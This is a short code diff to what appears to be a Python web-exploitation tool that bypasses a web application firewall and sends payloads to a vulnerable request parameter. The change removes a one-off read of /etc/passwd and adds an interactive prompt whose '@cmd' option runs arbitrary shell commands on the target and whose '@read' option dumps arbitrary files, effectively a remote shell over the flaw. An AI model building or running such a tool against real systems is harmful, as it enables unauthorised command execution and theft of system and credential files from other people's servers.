@@ -29,11 +29,19 @@ if __name__ == "__main__":
         isContinue = input("Do you want to continue? (y/n): ").lower()
         if isContinue.lower() != "y":
             exit()
-    requestHandler = RequestHandler(
-        urlTarget, method, vulnParam, params, cookie, isJsonBody
-    )
+    requestHandler = RequestHandler(urlTarget, method, vulnParam, params, cookie, isJsonBody)
     genwaf = genWAF(requestHandler)
     waf = genwaf.generateWAF()
     genPayload = GenPayload(requestHandler, waf)
-
-    print(genPayload.readFile("/etc/passwd"))
+    command = ""
+    while command != "@exit":
+        print("Type '@cmd [command]' to execute command")
+        print("Type '@read' [filename] to read file")
+        print("Type '@exit' to exit")
+        command = input(">> ")
+        if command.startswith("@cmd"):
+            command = command.replace("@cmd ", "")
+            print(genPayload.execPayload(command))
+        elif command.startswith("@read"):
+            filename = command.replace("@read ", "")
+            print(genPayload.readFile(filename))
